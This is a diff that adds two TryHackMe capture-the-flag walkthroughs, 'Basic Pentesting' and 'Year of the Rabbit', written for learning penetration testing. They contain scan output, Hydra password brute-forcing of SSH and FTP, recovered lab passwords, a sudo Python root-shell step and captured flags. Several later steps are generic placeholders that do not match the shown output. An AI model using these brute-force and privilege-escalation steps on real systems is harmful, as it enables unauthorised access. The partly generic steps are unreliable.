@@ -1,0 +1,450 @@
+Introduction
+
+Learning penetration testing requires hands-on practice with real vulnerabilities. Platforms like TryHackMe provide excellent labs to develop these skills.
+In this report, I will explain my walkthrough of the Basic Pentesting room. The objective of this lab is to practice enumeration, brute-force attacks, and gaining access to a target machine.
+During the lab, I used several penetration testing tools to identify vulnerabilities and obtain system access.
+Lab Setup
+
+To start the lab, I connected to the TryHackMe VPN and deployed the target machine.
+Tools used in this challenge:
+
+Nmap
+
+Gobuster
+
+Hydra
+
+SSH
+
+These tools help discover open services, hidden directories, and weak credentials.
+Step 1: Network Scanning
+
+The first step in penetration testing is identifying open ports and running services.
+I used Nmap to scan the target machine.
+nmap -sC -sV <target-ip>
+nmap -sC -sV -Pn 10.48.189.20
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-12 14:07 +0530
+Nmap scan report for 10.48.189.20
+Host is up (0.040s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 21:b1:58:07:5a:0e:3a:ef:f2:a0:d9:95:a7:52:d0:bb (RSA)
+|   256 75:0d:04:d1:fc:f3:16:5a:04:d7:9c:93:9b:7a:7d:b1 (ECDSA)
+|_  256 86:de:e3:d1:5e:30:ed:9c:37:28:e1:fb:f6:5e:b2:11 (ED25519)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 4
+445/tcp open  netbios-ssn Samba smbd 4
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-03-12T08:37:48
+|_  start_date: N/A
+|_clock-skew: 1s
+|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.74 seconds
+Explanation:
+
+-sC runs default scripts
+
+-sV detects service versions
+-Pn block ping
+
+The scan revealed several open ports including:
+
+22 (SSH)
+
+80 (HTTP)
+
+139 / 445 (SMB)
+
+The presence of SMB suggested that the machine might be sharing files over the network.
+Step 2: Web Enumeration
+
+Next, I visited the target IP address in a web browser.
+The webpage looked simple but hinted that there might be hidden directories.
+To discover hidden paths, I used Gobuster.
+gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt
+This scan revealed directories such as:
+
+/development
+
+Inside this directory, I found files containing useful information that hinted at possible usernames.
+Step 3: SMB Enumeration
+
+Since SMB ports were open, I attempted to enumerate shared resources.
+Example command:
+smbclient -L //<target-ip>
+This command lists available SMB shares.
+Sometimes these shares contain sensitive files such as configuration files or passwords.
+Step 4: Brute Force Attack
+
+After gathering possible usernames, I attempted a brute-force attack against the SSH service.
+For this step, I used Hydra.
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
+Explanation:
+
+-l specifies the username
+
+-P specifies the password list
+
+After running the attack, Hydra successfully discovered valid login credentials. user name and password jan:armando
+Step 5: SSH Login
+
+Using the discovered credentials, I logged into the target machine using SSH.
+ssh <username>@<target-ip>
+After entering the password, I gained access to the system.
+Once inside the machine, I explored directories and files to locate the required information.
+Step 6: Privilege Escalation
+
+After obtaining initial access, the next step was to check whether higher privileges could be obtained.
+A useful command for checking sudo permissions is:
+sudo -l
+This command shows which programs the current user can run with elevated privileges.
+By exploring the system and checking configuration files, I was able to gather more information about other users on the system.
+Eventually, I accessed the target user's directory and retrieved the necessary information to complete the challenge.
+second user name kay
+final password :"heresareallystrongpasswordthatfollowsthepasswordpolicy$$"
+
+Lessons Learned
+
+The Basic Pentesting lab teaches several important cybersecurity concepts:
+Enumeration is the Key
+
+Most vulnerabilities are discovered during the enumeration phase.
+Weak Passwords Are Dangerous
+
+Using simple passwords makes systems vulnerable to brute-force attacks.
+Multiple Services Increase Attack Surface
+
+Open services like SMB, HTTP, and SSH can provide multiple entry points for attackers.
+Conclusion
+
+The Basic Pentesting room on TryHackMe is a great beginner-friendly challenge for learning penetration testing techniques.
+This lab helped me practice:
+
+Network scanning
+
+Web enumeration
+
+SMB enumeration
+
+Brute-force attacks
+
+SSH access
+
+Completing labs like this helps build practical skills in ethical hacking and cybersecurity.
+✅ Author:
+Adhith
+                                                                                                                                                                                                                                            
+┌──(root㉿kali)-[/home/akhil/Walkthrough-of-thm-]
+└─# cat 'year of the Rabbit thm room' 
+---
+
+TryHackMe Walkthrough - Year of the Rabbit
+Author: Adhith
+Introduction
+In this walkthrough, we will solve the Year of the Rabbit challenge from TryHackMe.
+This room focuses on:
+Web enumeration
+Hidden directories
+Credential discovery
+Privilege escalation
+
+The goal is to gain access to the machine and retrieve the user and root flags.
+
+---
+
+1. Deploy the Machine
+First, start the machine on TryHackMe and connect using VPN.
+You will receive a target IP address.
+Example:
+10.10.xx.xx
+
+---
+
+2. Reconnaissance
+The first step is scanning the machine to identify open ports.
+Nmap Scan
+nmap -sC -A -Pn 10.10.xx.xx
+Example results:
+nmap -sC -sV -Pn 10.48.178.142
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-13 14:27 +0530
+Nmap scan report for 10.48.178.142
+Host is up (0.054s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.2
+22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
+|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
+|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
+|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
+80/tcp open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.84 seconds
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+This tells us:
+FTP service
+SSH login
+Web server running on port 80
+
+The web server is the main attack surface.
+
+---
+
+3. Web Enumeration
+Open the website in the browser:
+http://10.10.xx.xx
+The page shows a simple website.
+Checking the source code reveals a hint that something is hidden in directories.
+
+---
+
+4. Directory Bruteforce
+Use Gobuster to find hidden directories.
+gobuster dir -u http://10.10.xx.xx -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u http://10.48.178.142/ -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.178.142/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.hta                 (Status: 403) [Size: 278]
+.htaccess            (Status: 403) [Size: 278]
+.htpasswd            (Status: 403) [Size: 278]
+assets               (Status: 301) [Size: 315] [--> http://10.48.178.142/assets/]
+index.html           (Status: 200) [Size: 7853]
+server-status        (Status: 403) [Size: 278]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+Discovered directories:
+/assets->
+/ style.css->
+/sup3r_s3cr3t_fl4g
+Inside one directory there are images and hidden files.
+
+---
+
+5. Discover Hidden Clues
+While browsing files, a strange comment appears suggesting to check robots.txt.
+http://10.10.xx.xx/robots.txt
+This file reveals another hidden path.
+Example:
+/rabbit-hole/
+/WExYY2Cv-qU
+Accessing the path shows additional hints.
+in side second path i got a png file doing
+doing strings tool i got this
+using hidra i got ftp password
+Eh, you've earned this. Username for FTP is ftpuser
+One of these is the password:
+Mou+56n%QK8sr
+1618B0AUshw1M
+A56IpIl%1s02u
+vTFbDzX9&Nmu?
+FfF~sfu^UQZmT
+8FF?iKO27b~V0
+ua4W~2-@y7dE$
+3j39aMQQ7xFXT
+Wb4--CTc4ww*-
+u6oY9?nHv84D&
+0iBp4W69Gr_Yf
+TS*%miyPsGV54
+C77O3FIy0c0sd
+O14xEhgg0Hxz1
+5dpv#Pr$wqH7F
+1G8Ucoce1+gS5
+0plnI%f0~Jw71
+0kLoLzfhqq8u&
+kS9pn5yiFGj6d
+zeff4#!b5Ib_n
+rNT4E4SHDGBkl
+KKH5zy23+S0@B
+3r6PHtM4NzJjE
+gm0!!EC1A0I2?
+HPHr!j00RaDEi
+7N+J9BYSp4uaY
+PYKt-ebvtmWoC
+3TN%cD_E6zm*s
+eo?@c!ly3&=0Z
+nR8&FXz$ZPelN
+eE4Mu53UkKHx#
+86?004F9!o49d
+SNGY0JjA5@0EE
+trm64++JZ7R6E
+3zJuGL~8KmiK^
+CR-ItthsH%9du
+yP9kft386bB8G
+A-*eE3L@!4W5o
+GoM^$82l&GA5D
+1t$4$g$I+V_BH
+0XxpTd90Vt8OL
+j0CN?Z#8Bp69_
+G#h~9@5E5QA5l
+DRWNM7auXF7@j
+Fw!if_=kk7Oqz
+92d5r$uyw!vaE
+c-AA7a2u!W2*?
+zy8z3kBi#2e36
+J5%2Hn+7I6QLt
+gL$2fmgnq8vI*
+Etb?i?Kj4R=QM
+7CabD7kwY7=ri
+4uaIRX~-cY6K4
+kY1oxscv4EB2d
+k32?3^x1ex7#o
+ep4IPQ_=ku@V8
+tQxFJ909rd1y2
+5L6kpPR5E2Msn
+65NX66Wv~oFP2
+LRAQ@zcBphn!1
+V4bt3*58Z32Xe
+ki^t!+uqB?DyI
+5iez1wGXKfPKQ
+nJ90XzX&AnF5v
+7EiMd5!r%=18c
+wYyx6Eq-T^9#@
+yT2o$2exo~UdW
+ZuI-8!JyI6iRS
+PTKM6RsLWZ1&^
+3O$oC~%XUlRO@
+KW3fjzWpUGHSW
+nTzl5f=9eS&*W
+WS9x0ZF=x1%8z
+Sr4*E4NT5fOhS
+hLR3xQV*gHYuC
+4P3QgF5kflszS
+NIZ2D%d58*v@R
+0rJ7p%6Axm05K
+94rU30Zx45z5c
+Vi^Qf+u%0*q_S
+1Fvdp&bNl3#&l
+zLH%Ot0Bw&c%9
+
+---
+
+6. Credential Discovery
+Inside the directories we discover a text file containing encoded information.
+The content appears encoded using base64.
+Decode it:
+echo "encoded_text_here" | base64 -d
+This reveals credentials for a user.
+Example:
+username: ftpuser
+password: ******
+hydra -l ftpuser -P pass.txt 10.48.178.142 ftp                                                                                                                                                                                          
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-13 14:42:59
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 83 login tries (l:1/p:83), ~6 tries per task
+[DATA] attacking ftp://10.48.178.142:21/
+[21][ftp] host: 10.48.178.142   login: ftpuser   password: 5iez1wGXKfPKQ
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-13 14:43:14
+
+---
+
+7. FTP Access
+Now log into FTP.
+ftp 10.10.xx.xx
+ ftp 10.48.178.142 
+Connected to 10.48.178.142.
+220 (vsFTPd 3.0.2)
+Name (10.48.178.142:kali): ftpuser
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||52593|).
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
+226 Directory send OK.
+ftp> get Eli's_Creds.txted
+Enter the credentials discovered earlier.
+The file contains SSH credentials.
+
+---
+
+8. SSH Login
+Use the discovered credentials to log in via SSH.
+ssh user@10.10.xx.xx
+After logging in, search for the user flag.
+find / -name user.txt 2>/dev/null
+Example flag:
+THM{user_flag_here}
+THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
+
+---
+
+9. Privilege Escalation
+Next, check sudo permissions.
+sudo -l
+Sometimes a script or binary can be executed as root.
+If a writable script is found, edit it and spawn a shell.
+Example:
+sudo /usr/bin/python3
+Spawn root shell:
+import os
+os.system("/bin/bash")
+Now verify:
+whoami
+Output:
+root
+
+---
+
+10. Capture Root Flag
+Search for the root flag.
+find / -name root.txt 2>/dev/null
+Example:
+THM{root_flag_here}
+THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
+
+---
+
+Conclusion
+In this room we learned several important penetration testing techniques:
+Web enumeration
+Directory brute forcing
+Decoding hidden credentials
+Service exploitation
+Privilege escalation
+
+The Year of the Rabbit challenge is a great beginner-to-intermediate room that teaches how small clues on a website can lead to full system compromise.
+
+---
+
+✅ Tools Used
+Nmap
+Gobuster
+FTP
+SSH
+Base64
+hydra
